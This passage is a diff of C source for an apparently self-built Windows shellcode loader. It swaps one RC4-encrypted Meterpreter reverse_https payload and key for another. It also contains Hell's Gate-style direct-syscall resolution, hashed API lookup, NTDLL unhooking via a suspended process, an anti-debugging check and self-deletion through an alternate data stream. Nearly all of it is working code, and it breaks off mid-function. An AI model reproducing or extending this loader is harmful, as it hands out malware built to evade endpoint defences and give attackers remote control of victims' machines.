@@ -1,44 +1,30 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <Windows.h>
-#include <winternl.h>
 #include "headers.h"
-
-
-// Define the structures and function prototypes
-typedef NTSTATUS(NTAPI* NtQueryInformationProcessPtr)(
-    HANDLE           ProcessHandle,
-    PROCESSINFOCLASS ProcessInformationClass,
-    PVOID            ProcessInformation,
-    ULONG            ProcessInformationLength,
-    PULONG           ReturnLength
-    );
-
-
-//Hells Gate Additions
-typedef struct _VX_TABLE_ENTRY {
-    PVOID   pAddress;
-    DWORD dwHash;
-    WORD    wSystemCall;
-    WORD    wRCXVal;
-} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;
-
-typedef struct _VX_TABLE {
-    VX_TABLE_ENTRY Allocate;
-    VX_TABLE_ENTRY Protect;
-    VX_TABLE_ENTRY Read;
-    VX_TABLE_ENTRY Write;
-    VX_TABLE_ENTRY ResumeThread;
-    VX_TABLE_ENTRY QueryInfoProcess;
-    VX_TABLE_ENTRY Create;
-    VX_TABLE_ENTRY MapViewOfSection;
-} VX_TABLE, * PVX_TABLE;
 
 //PVOID* pSystemCalls = NULL; //allocate PVOID * dwDLLSize memory for our array of pointers
 
 #define num_syscalls 50 //kinda expiremental , i sorta wnat this defined early on so i can just in and start populating
 PVOID* pSystemCalls[num_syscalls];
 VX_TABLE VxTable = { 0 };
+
+typedef struct _SYSCALL {
+    PVOID   pAddress;
+    DWORD   dwHash;
+} SYSCALL, * PSYSCALL;;
+
+typedef struct _SYSCALLS {
+    SYSCALL Write;
+    SYSCALL Allocate;
+    SYSCALL Protect;
+    SYSCALL Resume;
+    SYSCALL Query;
+    SYSCALL Read;
+}SYSCALLS_STRUCT, * PSYSCALLS_STRUCT;
+
+SYSCALLS_STRUCT syscallsStruct = { 0 };
+
 void initializeSystemCalls() {
 
     if (pSystemCalls == NULL) {
@@ -49,20 +35,8 @@ void initializeSystemCalls() {
 
     printf("Size of pSystemCalls %zu\n", num_syscalls);
 }
-// this is what SystemFunction032 function take as a parameter
-typedef struct
-{
-    DWORD   Length;
-    DWORD   MaximumLength;
-    PVOID   Buffer;
 
-} USTRING;
 
-// defining how does the function look - more on this structure in the api hashing part
-typedef NTSTATUS(NTAPI* fnSystemFunction032)(
-    struct USTRING* Img,
-    struct USTRING* Key
-    );
 //Maldev Academy Rc4
 BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
 
@@ -88,64 +62,55 @@ BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 }
 
 //met x64 reverse_https payload
-unsigned char Rc4CipherText[] = {
-        0xA8, 0xA4, 0xCE, 0x2A, 0x86, 0xD4, 0xB6, 0x85, 0x19, 0xCC, 0x21, 0x61, 0xE1, 0xC3, 0x07, 0xFD,
-        0x80, 0xFB, 0x43, 0x61, 0x3C, 0x6D, 0x2C, 0xD2, 0x15, 0xE0, 0xD9, 0x01, 0x34, 0x70, 0x0B, 0xDA,
-        0x4C, 0x76, 0x71, 0x77, 0xB1, 0x30, 0xED, 0x27, 0x98, 0x6B, 0xE3, 0x04, 0x6B, 0xD6, 0x14, 0x02,
-        0x36, 0xE0, 0xAF, 0x27, 0x7C, 0x6B, 0x0B, 0x6B, 0x2F, 0x96, 0xC5, 0xE5, 0x85, 0x8D, 0x70, 0x06,
-        0xBC, 0x8E, 0xA1, 0x65, 0xDB, 0x2A, 0x93, 0x7B, 0x29, 0x07, 0xA9, 0xC9, 0x79, 0xDD, 0x84, 0xAB,
-        0xDE, 0x52, 0xD0, 0xD8, 0xF4, 0xF9, 0xCE, 0x08, 0xC3, 0xA7, 0x6B, 0x95, 0x27, 0x40, 0x6A, 0xE9,
-        0xB5, 0x38, 0xC3, 0x72, 0x89, 0xCA, 0x6A, 0xA8, 0xA2, 0xE8, 0x09, 0x09, 0xA7, 0x02, 0xA6, 0xB3,
-        0x37, 0x39, 0xF3, 0x0D, 0xBA, 0x80, 0xF6, 0x20, 0x38, 0xC1, 0x49, 0x50, 0x4D, 0xB8, 0xCB, 0x50,
-        0xAB, 0x6E, 0x69, 0xFA, 0x49, 0xBC, 0x53, 0x4D, 0x82, 0xC2, 0x09, 0x61, 0xF5, 0x7B, 0x62, 0x1B,
-        0x56, 0xA8, 0x5F, 0xEF, 0xC4, 0xFD, 0xC8, 0xC9, 0x37, 0x84, 0xF5, 0x55, 0x9A, 0xAE, 0xC9, 0x11,
-        0x83, 0x29, 0x16, 0xD3, 0xA1, 0x34, 0x37, 0x2A, 0x6D, 0x73, 0x6E, 0x72, 0x85, 0x1F, 0xD7, 0xC3,
-        0x31, 0x1F, 0x6C, 0xEA, 0x78, 0x58, 0x9F, 0xF4, 0x50, 0x8E, 0xF5, 0x26, 0xC9, 0x7F, 0x87, 0x1D,
-        0x4C, 0x8C, 0x6E, 0xF0, 0xC0, 0xAE, 0x05, 0xE0, 0xDD, 0xEE, 0x28, 0xDF, 0x39, 0x17, 0x53, 0x42,
-        0xFD, 0xDC, 0x00, 0xBD, 0x31, 0xD8, 0xA0, 0x39, 0x3C, 0x56, 0x89, 0x86, 0x6E, 0x83, 0x32, 0x4B,
-        0xBD, 0x1A, 0x0E, 0xFB, 0xA8, 0x11, 0xC6, 0x9F, 0xB1, 0x7A, 0x42, 0x49, 0x84, 0x52, 0x6B, 0xB2,
-        0xE6, 0xE6, 0x24, 0x0F, 0x6D, 0x42, 0xD8, 0x65, 0x3B, 0x0C, 0x96, 0x38, 0x87, 0xDD, 0xA4, 0x48,
-        0xA5, 0x4C, 0x15, 0xEC, 0x69, 0x95, 0x19, 0x89, 0xD3, 0xB8, 0xD6, 0xB5, 0xAF, 0xC2, 0xF2, 0xD7,
-        0x32, 0x95, 0xA5, 0x23, 0x97, 0x79, 0x2C, 0x76, 0x18, 0x84, 0x07, 0xC8, 0xC6, 0xA2, 0xE0, 0x0D,
-        0x5D, 0x14, 0x18, 0x05, 0x1F, 0x3B, 0x19, 0xCD, 0xC3, 0xDB, 0x64, 0x25, 0x77, 0x10, 0xCE, 0x27,
-        0x6F, 0xFA, 0xDD, 0x59, 0x62, 0x80, 0x09, 0xC1, 0x8E, 0x68, 0x1E, 0xCC, 0xE7, 0x2B, 0xA3, 0xF6,
-        0x00, 0xFB, 0x13, 0xC7, 0x2E, 0x00, 0xD8, 0x35, 0x7D, 0xF3, 0xCB, 0x52, 0x64, 0x0E, 0x2B, 0x60,
-        0x7A, 0xF6, 0xFF, 0x7E, 0x70, 0x8D, 0xA4, 0x08, 0xB3, 0xD5, 0x8C, 0xBB, 0x79, 0xF5, 0x5D, 0x4D,
-        0x4B, 0x0E, 0xE5, 0x67, 0xA0, 0x51, 0xDE, 0x12, 0x79, 0x02, 0xA6, 0x2A, 0x9B, 0x66, 0x75, 0x41,
-        0xE7, 0x21, 0xBA, 0xDD, 0x1E, 0x50, 0x98, 0xF2, 0x36, 0x39, 0x41, 0x96, 0xE4, 0x1C, 0x7C, 0x25,
-        0xC9, 0xCF, 0xF0, 0x0B, 0x43, 0x11, 0xC6, 0x41, 0xA7, 0x86, 0x93, 0x10, 0x2E, 0x0A, 0xCE, 0xFF,
-        0x23, 0x7D, 0xB4, 0xF5, 0x5C, 0x0B, 0xA1, 0x3F, 0x34, 0x95, 0x48, 0x62, 0x43, 0x9A, 0x98, 0x0A,
-        0x08, 0xA8, 0xD0, 0xA3, 0x95, 0xE3, 0xB3, 0xAB, 0x13, 0x1D, 0x9A, 0x42, 0xB8, 0x57, 0xE1, 0x0E,
-        0x8F, 0x43, 0x31, 0x5F, 0xEA, 0xE0, 0x09, 0x68, 0x89, 0x99, 0xC6, 0xEB, 0xC6, 0xA9, 0x3D, 0x3A,
-        0x1B, 0x2E, 0x70, 0x27, 0x9A, 0xD2, 0x4E, 0x4A, 0xCD, 0xF4, 0xAA, 0x07, 0x9B, 0x8D, 0xA0, 0xA4,
-        0x91, 0x06, 0xA0, 0x31, 0xA3, 0xF1, 0x33, 0x55, 0x36, 0x16, 0xE5, 0x28, 0xBA, 0x05, 0xAA, 0xFF,
-        0xF9, 0x62, 0xB3, 0x7B, 0x02, 0x0E, 0x5A, 0x7D, 0x83, 0x87, 0xB2, 0xE0, 0x14, 0xFF, 0x2A, 0xD9,
-        0xA8, 0x4E, 0xD6, 0x16, 0x0D, 0x29, 0x84, 0xD8, 0xC9, 0xC3, 0xF0, 0xE9, 0xEB, 0x40, 0xE2, 0x70,
-        0x79, 0x66, 0xD4, 0xFF, 0xA5, 0xC2, 0x81, 0xE7, 0x47, 0x8F, 0xAA, 0xD5, 0xC7, 0x3A, 0x6C, 0xCE,
-        0x63, 0xDF, 0x60, 0x46, 0x3B, 0xEE, 0x55, 0x6B, 0x33, 0xEB, 0x4F, 0x34, 0x2D, 0xA0, 0xAC, 0x04,
-        0xCA, 0xB7, 0x70, 0xF8, 0x5A, 0x5D, 0xCC, 0xF6, 0x52, 0x26, 0x12, 0xE6, 0xD3, 0x12, 0xE3, 0x66,
-        0xFE, 0xD6, 0xF3, 0xEB, 0xDA, 0x4F, 0xBB, 0xA5, 0x03, 0xD4, 0xA7, 0x3D, 0xDC, 0xF3, 0xE6, 0xEC,
-        0x2C, 0xCE, 0xBE, 0x81, 0xC2, 0x59, 0xB7, 0xB1, 0x5D, 0xF2, 0x0E, 0x99, 0x01, 0x02, 0xA2, 0xD3,
-        0xE4, 0xCE, 0x3F, 0xC2, 0x34, 0xAB, 0x36, 0xD1, 0xCD, 0x0D, 0x4A, 0xF7, 0x09, 0x64, 0xE0, 0xE8,
-        0x71, 0x5D, 0x30, 0x65, 0xD6, 0x8E, 0x0C, 0x0E, 0x61, 0xB2, 0xEE, 0xC3, 0x04, 0x44, 0x09, 0xBF,
-        0x22, 0x37, 0xDB, 0x9E, 0x64, 0x82, 0x59, 0xC1, 0xB2, 0xE8, 0xEC, 0x7A, 0x56, 0xC7, 0x08, 0x66,
-        0x13, 0x73, 0xBE, 0xCA, 0xB9, 0xA0, 0xDD, 0xF3, 0x63, 0x40, 0xF4, 0xC9, 0xDA, 0xCD, 0x40, 0x21,
-        0x5A, 0x52, 0xF5, 0xEF, 0xE1, 0xBD, 0x7E, 0x91, 0x66, 0x35, 0x11, 0x58, 0x59, 0xDA, 0xD1, 0x79,
-        0xD1, 0x0F, 0x49, 0x45, 0xC2, 0xA7, 0x8C, 0xA6, 0xA0, 0x95, 0x93, 0xDF, 0x69, 0xD3, 0xC1, 0x5A,
-        0x19, 0x24, 0xF4, 0x39, 0x37, 0xD3, 0x0A, 0xF7, 0x90, 0xBB, 0x2A, 0x0D, 0xBC, 0x65, 0x43, 0x24,
-        0x23, 0xE1, 0x23, 0x65, 0xBE, 0xE5, 0x5E, 0x96, 0xA5, 0x85, 0x4D, 0xD4, 0xEC, 0x00, 0x2C, 0x9C,
-        0xC1, 0x5D, 0xB8, 0xB6, 0x8D, 0xE4, 0x55, 0x89, 0x82, 0x79, 0xB5, 0x2C, 0x9F, 0x6B, 0x23, 0xC4,
-        0x07, 0x4D, 0x9C, 0x00, 0x12, 0xC1, 0x6F, 0x1A, 0x07, 0x42, 0x48, 0x1F, 0xB5, 0xE1, 0xE9, 0x9D,
-        0xFE, 0x79, 0x38, 0x3A, 0x8F, 0x99, 0x2D, 0x20, 0x40, 0x91, 0x56, 0x0F, 0xD7, 0x70, 0x79, 0xC6,
-        0x8C, 0xBB, 0x82, 0x28, 0xAC };
 
+unsigned char Rc4CipherText[] = {
+        0x46, 0x3B, 0xF1, 0x61, 0x98, 0xEE, 0xB5, 0x55, 0x64, 0x4F, 0x8A, 0x60, 0x67, 0xAE, 0x72, 0xE7,
+        0xEB, 0x82, 0xD5, 0x9D, 0x03, 0x57, 0xC8, 0xF9, 0x6D, 0x03, 0xB1, 0x75, 0x36, 0x7F, 0xA6, 0x35,
+        0x66, 0x14, 0xCC, 0x25, 0x65, 0x3E, 0x70, 0xEA, 0xBB, 0x40, 0x07, 0x72, 0x76, 0xCA, 0xCD, 0x22,
+        0x55, 0xD4, 0x26, 0xA7, 0x26, 0xFB, 0x32, 0xC0, 0xD7, 0xB3, 0x04, 0xD7, 0x1A, 0xDC, 0xC0, 0xE7,
+        0x27, 0x47, 0x2C, 0x7F, 0xF7, 0xEA, 0xD4, 0xF3, 0x5B, 0x81, 0x02, 0xC9, 0xF9, 0x55, 0xC8, 0x1B,
+        0x18, 0xDB, 0x34, 0x17, 0x11, 0x37, 0xCC, 0x32, 0xA1, 0x3A, 0x3B, 0xA3, 0xB3, 0x8B, 0xC6, 0x29,
+        0x0D, 0x7B, 0x0D, 0xDB, 0xF1, 0xB6, 0x29, 0x51, 0xE3, 0x4B, 0x60, 0xDA, 0x4C, 0x09, 0xEC, 0x65,
+        0xF5, 0x68, 0xBE, 0x50, 0x7E, 0x08, 0xFD, 0x3F, 0x97, 0x54, 0x3F, 0x4B, 0x88, 0xF4, 0x9B, 0x02,
+        0x89, 0x0E, 0x9D, 0x4B, 0x65, 0xE3, 0xA7, 0xC1, 0x00, 0x7F, 0xA0, 0x02, 0xBC, 0x16, 0x83, 0x08,
+        0x91, 0xC7, 0x20, 0x01, 0x94, 0x0E, 0xB0, 0x97, 0x73, 0x03, 0xA0, 0x98, 0xEB, 0xF5, 0x49, 0x2A,
+        0x48, 0x55, 0x36, 0x2E, 0xB5, 0xC5, 0xEA, 0x14, 0x4F, 0xD1, 0x7D, 0xD5, 0x79, 0xA8, 0xEC, 0xE4,
+        0xBA, 0xA0, 0x51, 0x74, 0x70, 0x8E, 0xAD, 0xCE, 0x5B, 0x8E, 0xFB, 0xF5, 0xC2, 0x80, 0x15, 0xBD,
+        0x5D, 0xFF, 0xE9, 0x6D, 0xD2, 0x2D, 0xE7, 0x94, 0xF4, 0x96, 0xC3, 0x07, 0x95, 0xD1, 0xB5, 0x65,
+        0x05, 0xD6, 0x3B, 0x42, 0x5F, 0xC0, 0x13, 0x11, 0x54, 0xC3, 0xE7, 0x80, 0x48, 0x88, 0xEF, 0x56,
+        0x3B, 0xF5, 0x8C, 0xF8, 0xEE, 0xAA, 0x89, 0x4F, 0x72, 0x57, 0x25, 0x64, 0xF1, 0xE2, 0x0B, 0x68,
+        0xD5, 0xF0, 0xB7, 0x30, 0x53, 0xBD, 0x12, 0xDF, 0xFD, 0x16, 0xD9, 0x55, 0xC5, 0xC5, 0xC5, 0xB3,
+        0x04, 0xD2, 0xE7, 0x3C, 0x78, 0x8D, 0x79, 0xEF, 0x96, 0x39, 0x57, 0x25, 0xF7, 0x70, 0x7B, 0xBF,
+        0x3B, 0xC9, 0xC5, 0xE0, 0x87, 0xFA, 0xB9, 0x16, 0x50, 0x0B, 0x8B, 0x9A, 0x22, 0x0C, 0x81, 0xE7,
+        0x3F, 0xD8, 0xFF, 0xD9, 0xE6, 0x83, 0x4C, 0x5A, 0x0C, 0x2C, 0x63, 0x28, 0x05, 0xB6, 0xE9, 0x05,
+        0x82, 0x06, 0x62, 0x71, 0x56, 0x31, 0x57, 0x60, 0xA1, 0xC7, 0xD6, 0xA9, 0x50, 0x77, 0xDB, 0x12,
+        0xCE, 0xC6, 0xD7, 0x5A, 0xA7, 0x74, 0x77, 0x1B, 0xFD, 0x9C, 0x82, 0xD1, 0xBA, 0x71, 0x78, 0x98,
+        0x45, 0xC1, 0x8A, 0xD1, 0x62, 0x17, 0xE7, 0xBC, 0x11, 0x1D, 0x2B, 0xC6, 0x5C, 0x49, 0x72, 0x2F,
+        0x40, 0xA9, 0x6C, 0x7C, 0x39, 0xFA, 0xCE, 0xCD, 0xE7, 0xAD, 0x42, 0xC0, 0xEC, 0x08, 0x7F, 0x89,
+        0x00, 0xDD, 0x22, 0xA7, 0x59, 0xD0, 0x33, 0x34, 0xCA, 0x5E, 0x30, 0x59, 0x32, 0x5C, 0xB8, 0x9A,
+        0x1D, 0x1C, 0xA7, 0xEE, 0x69, 0xFE, 0xE9, 0xE5, 0x33, 0xF5, 0x58, 0x4C, 0xDE, 0x1D, 0xE3, 0xF8,
+        0x4E, 0x5E, 0xFC, 0x9F, 0x96, 0xF9, 0x32, 0x3D, 0x1E, 0xF8, 0x00, 0x76, 0x22, 0x8C, 0xA0, 0xD5,
+        0xA9, 0x38, 0x45, 0x52, 0x16, 0x89, 0x3E, 0x08, 0x9D, 0xEB, 0x50, 0x6F, 0x75, 0xEC, 0x48, 0xEF,
+        0x13, 0x47, 0xBB, 0x4C, 0xF8, 0x36, 0xE8, 0x16, 0xA8, 0xF5, 0x2B, 0x85, 0x6A, 0x41, 0x64, 0x2E,
+        0x94, 0x10, 0x9E, 0xF5, 0x87, 0xCB, 0xD0, 0x03, 0x23, 0x84, 0xBD, 0x54, 0x3E, 0x33, 0xC0, 0xAB,
+        0x16, 0xCB, 0xB5, 0xA2, 0x07, 0x26, 0xD3, 0xE9, 0xF9, 0x32, 0x3A, 0x88, 0x6C, 0x59, 0x3D, 0x75,
+        0x6E, 0xA8, 0x76, 0x73, 0xF0, 0x4A, 0xC4, 0xEA, 0xA7, 0x70, 0xCB, 0xE8, 0xDB, 0xBC, 0x82, 0x1F,
+        0x4B, 0x05, 0xE9, 0x2A, 0x2C, 0xF4, 0x9B, 0xBE, 0x5E, 0xF9, 0xB1, 0xC3, 0x0D, 0x3E, 0x31, 0x18,
+        0x42, 0xD6, 0xBE, 0x78, 0xF2, 0x54, 0x33, 0x40, 0x18, 0x3F, 0x63, 0x1E, 0x79, 0xBD, 0x9C, 0xFF,
+        0xF9, 0x1A, 0xFF, 0x3A, 0xCC, 0xB9, 0xA7, 0x5C, 0xE3, 0xF8, 0x05, 0x2E, 0x59, 0x1A, 0xDD, 0x2D,
+        0xF6, 0x39, 0x49, 0x24, 0xDB, 0xDD, 0x60, 0xFD, 0x04, 0x1F, 0xCF, 0xFC, 0xEE, 0xCF, 0xFF, 0x3E,
+        0x30, 0x39, 0x60, 0xE8, 0x40, 0x08, 0xBE, 0xA4, 0xD1, 0x94, 0xBA, 0xCA, 0x60, 0x6F, 0x24, 0xAF,
+        0x04, 0x3F, 0x5F, 0xA4, 0xDE, 0x43, 0x07, 0x94, 0x36, 0xDC, 0x20, 0x52, 0xF2, 0x01, 0x06, 0x57,
+        0x17, 0xFC, 0x18, 0x4D, 0xE0, 0xBC, 0xDF, 0x5F, 0xB9, 0x3D };
+
+
+unsigned char Rc4Key[] = {
+        0x4E, 0x17, 0xAB, 0x94, 0x9F, 0x1B, 0xFD, 0xCB, 0xB0, 0x02, 0x40, 0x57, 0x49, 0xBD, 0xB2, 0x50 };
 DWORD gSSN = 0;
 PVOID gJMP = NULL;
 WORD gCurrentSyscall = 0;
 
 
-unsigned char Rc4Key[] = {
-        0xAD, 0x09, 0x40, 0xE9, 0x73, 0xF5, 0x00, 0x57, 0x5D, 0xD8, 0xAE, 0x89, 0x53, 0x8E, 0x05, 0x5D };
 
 void printByteArray(const unsigned char* array, size_t size) {
     printf("Contents of the byte array:\n");
@@ -156,12 +121,17 @@ void printByteArray(const unsigned char* array, size_t size) {
 }
 
 
+//Hooked = Base NTDLL address of local process since its not suspended
+//Unhooked = Remote process NTDLL (found @ same base address) but copied into local buffer
+
+/*
 void detectDebug() {
     // Calling NtQueryInformationProcess with the 'ProcessDebugPort' flag
 
     DWORD64 isDebuggerPreset = 0;
-
-    //NtQueryProcessInformationPtr myNtQueryProcessInformation2 = (NtQueryProcessInformationPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+    NTSTATUS STATUS = 0;
+    NtQueryInformationProcessPtr myNtQueryProcessInformation2 = (NtQueryInformationProcessPtr)GetProcAddress(LoadLibraryA("NTDLL.DLL"), "NtQueryInformationProcess");
+/*
     gCurrentSyscall = VxTable.QueryInfoProcess.wRCXVal;
     BOOL STATUS = NoahRead3(
         GetCurrentProcess(),
@@ -170,7 +140,7 @@ void detectDebug() {
         sizeof(DWORD64),
         NULL
     );
-
+    
     if (isDebuggerPreset != NULL) {
         // detected a debugger
         printf("PROCESS IS BEING WATCHED!!!!!!!!!!!!!!!!!");
@@ -203,6 +173,65 @@ void detectDebug() {
 
     return FALSE;
 }
+*/
+
+
+EXTERN_C void UpdateGlobals(DWORD input) {
+    printf("Indexes of systemcalls %d\n", sizeof(pSystemCalls) / sizeof(pSystemCalls[0]));
+    uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
+    //PVOID address = (PVOID)(0xdeadbeef);
+    //uint64_t* address = (uint64_t*)0x00007FF97312D232;
+
+    printf("Getting JMP! 0x%p\n", address);
+    gJMP = address;
+    uint64_t address2 = (uint64_t)address;
+    PULONG oldProts = NULL;
+    getchar();
+    printf("Input val to UpdateGloabls: %d\n", input);
+    getchar();
+
+    if (input == 0) { //Read
+        printf("Wow! Read Syscall Getter called: %d\n", VxTable.Read.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Read.wSystemCall;
+        getchar();
+        return (DWORD)VxTable.Read.wSystemCall;
+    }
+    else if (input == 1) { //Write
+        printf("Wow! WRite Syscall Getter called: %d\n", VxTable.Write.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Write.wSystemCall;
+        getchar();
+        return (DWORD)VxTable.Write.wSystemCall;
+    }
+    else if (input == 2) { //Allocate
+        return VxTable.Allocate.wSystemCall;
+    }
+    else if (input == 3) { //Protect
+        printf("Wow! Protect Syscall Getter called: %d\n", VxTable.Protect.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.Protect.wSystemCall;
+        getchar();
+        return VxTable.Protect.wSystemCall;
+    }
+    else if (input == 4) { //ResumeThread
+        printf("Wow! Resume Syscall Getter called: %d\n", VxTable.ResumeThread.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.ResumeThread.wSystemCall;
+        getchar();
+        return VxTable.ResumeThread.wSystemCall;
+    }
+    else if (input == 5) { //QueryInfoProcess
+        printf("Wow! QueryInfo Syscall Getter called: %d\n", VxTable.QueryInfoProcess.wSystemCall);
+        printf("gSSN: 0x%p", &gSSN);
+        gSSN = VxTable.QueryInfoProcess.wSystemCall;
+        getchar();
+        return VxTable.QueryInfoProcess.wSystemCall;
+    }
+    printf("Syscall input not found, check your input in C or RCX\n");
+
+}
+
 
 #define NEW_STREAM L":Noah"
 BOOL DeletesSelf() {
@@ -322,96 +351,6 @@ DWORD HashStringDjb2A(_In_ PCHAR String)
 }
 
 
-BOOL GetVXTableEntry(DWORD dwDLLSize, PVOID* pSystemCalls, PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, OUT PVX_TABLE_ENTRY syscallTableEntry) {
-
-    //Using our image export directory from the GetImageExportDir function we can use to find # of functions, function names, and the locations 
-    //of those functions within their respect RVA arrays
-    //Note that since they're RVA's they need to be added onto the module base address/
-    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
-    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
-    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals); // NOTE THIS IS A PWORD NOT A PDWORD... yeah that took about an hr of debugging to fix
-
-    //Then we seasrch through all the functions for a function name hash that matches ours
-    for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
-        PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
-        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
-
-
-        if (HashStringDjb2A(pczFunctionName) == syscallTableEntry->dwHash) {
-            printf("FOUND!!\n");
-            printf("Function Address 0x%p\n", pFunctionAddress);
-            printf("Function Name %s\n", pczFunctionName);
-            printf("A: 0x%0.8X\n", HashStringDjb2A(pczFunctionName));
-            printf("B: 0x%0.8X\n", syscallTableEntry->dwHash);
-
-            syscallTableEntry->pAddress = pFunctionAddress; // I got issues landing on ret a lot and this fixed it?
-            printf("0x%p", syscallTableEntry->pAddress);
-            getchar();
-            //hells gate on github will perform a test to see if the fucntion has been hooked -To Do list is to add maldev academy syscallhook testing here
-            // 
-           //Now we will search the opcodes for byte sequences relating to system calls!
-
-
-            //oh wow this is actually like incredibly simple....
-            WORD byteCounter = 0;
-            while (TRUE) {
-                //pFunctionAddress = *((PBYTE)pFunctionAddress - 10);
-                //First check if pFunctionAddress is the syscall itself, if so we need to go up to start of syscall sturcture
-                //Recall syscall  = 0x0f, 0x05
-                //Adding 0x01 onto the memory address value every time then taking the actual value by de-referencing pointer w *
-                //to see what the legit opcode is
-                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0x0f && *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x05) {
-                    printf("Landed on `syscall` or incremented too far\n");
-                    return FALSE;
-                }
-                //Now check for ret as well
-                if (*((PBYTE)syscallTableEntry->pAddress + byteCounter) == 0xc3) {
-                    printf("Landed on `ret` or incremented too far\n");
-                    return FALSE;
-                }
-                // NOTE THE OPCODES OF A PROPER SYSCALL IN WIN64 SHOULD BE:
-                // mov r10,rcx
-                // mov rcx,SSN
-                //
-                //in your head just think - dereference - pbyte - location
-                if (
-                    *((PBYTE)pFunctionAddress + byteCounter) == 0x4c &&
-                    *((PBYTE)pFunctionAddress + byteCounter + 1) == 0x8b &&
-                    *((PBYTE)pFunctionAddress + byteCounter + 2) == 0xd1 &&
-                    *((PBYTE)pFunctionAddress + byteCounter + 3) == 0xb8 &&
-                    *((PBYTE)pFunctionAddress + byteCounter + 6) == 0x00 && // NOTE PLUS 6 OFFSET
-                    *((PBYTE)pFunctionAddress + byteCounter + 7) == 0x00    // NOTE PLUS 7 OFFSET
-                    ) {
-
-                    //Now we need to calculate the actual systemcall number which we use 4 & 5 for.
-                    //
-                    BYTE high = *((PBYTE)pFunctionAddress + 5 + byteCounter); // Offset 5
-                    BYTE low = *((PBYTE)pFunctionAddress + 4 + byteCounter); // Offset 4
-
-                    syscallTableEntry->wSystemCall = (DWORD)((high << 8) | low);
-                    printf("Systemcall SSN %d\n", syscallTableEntry->wSystemCall);
-
-                    // syscallTableEntry->pAddress = (PBYTE)0xDEADBEEF; // I got issues landing on ret a lot and this fixed it?
-                   // syscallTableEntry->wSystemCall = (DWORD)58;
-
-                    //now all thats left is to call the function using an asm 
-                    break;
-                }
-                byteCounter++;
-            }
-        }
-
-    }
-    //Now begin loop to populate list of syscall locaitons
-
-        //Now since we don't want to pass strings of APIs we will hash and compare hashes to pre-hashed list.
-        //See the API_Hashing module example
-    return TRUE;
-}
-
-
-
-
 
 void ReadNTDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemoteTextSection,IN DWORD sTextSize,OUT PVOID* pModuleBuffer) {
 
@@ -425,6 +364,9 @@ void ReadNTDLL(HANDLE hProcess, IN PVOID pLocalTextSection, IN PVOID pRemoteText
     printf("Pause\n");
     getchar();
     printf("Reading remote suspended/debugged process @ .text section address 0x%p, and copying to local buffer 0x%p\n", pRemoteTextSection, pUnhookedBuf);
+    //pRemoteTextSection comes from the GetImageExportDirectory function when we find the .text address within our own local process actually. Variable name 
+    //used more to represent the fact that we're using it to find the unhooked clean .text section in remote process even though its the same address as 
+    //what is used by this current process.
     if (!ReadProcessMemory(hProcess, pRemoteTextSection, pUnhookedBuf, sLocalTextSection,&sReadBbytes) ){
         printf("Could not read unhooked NTDLL.\n");
     }
@@ -488,15 +430,208 @@ void CreateSuspendedProcess(IN char* processName, IN wchar_t* moduuleName, OUT P
     return;
   
 }
-typedef NTSTATUS(NTAPI* NtQueryInformationProcessPtr)(
-    HANDLE ProcessHandle,
-    PROCESSINFOCLASS ProcessInformationClass,
-    PVOID ProcessInformation,
-    ULONG ProcessInformationLength,
-    PULONG ReturnLength
-    );
 
 
+BOOL GetAPIHashAddress(IN PVOID pModuleBase,IN PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, OUT SYSCALL* syscallTableEntry) {
+
+        //Using our image export directory from the GetImageExportDir function we can use to find # of functions, function names, and the locations 
+        //of those functions within their respect RVA arrays
+        //Note that since they're RVA's they need to be added onto the module base address/
+        PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
+        PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
+        PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals); // NOTE THIS IS A PWORD NOT A PDWORD... yeah that took about an hr of debugging to fix
+
+        //Then we seasrch through all the functions for a function name hash that matches ours
+        for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
+            PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[i]);
+            PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]];
+
+
+            if (HashStringDjb2A(pczFunctionName) == syscallTableEntry->dwHash) {
+                printf("FOUND!!\n");
+                printf("Function Address 0x%p\n", pFunctionAddress);
+                printf("Function Name %s\n", pczFunctionName);
+                printf("A: 0x%0.8X\n", HashStringDjb2A(pczFunctionName));
+                printf("B: 0x%0.8X\n", syscallTableEntry->dwHash);
+
+                syscallTableEntry->pAddress = pFunctionAddress; // I got issues landing on ret a lot and this fixed it?
+                printf("0x%p", syscallTableEntry->pAddress);
+                getchar();
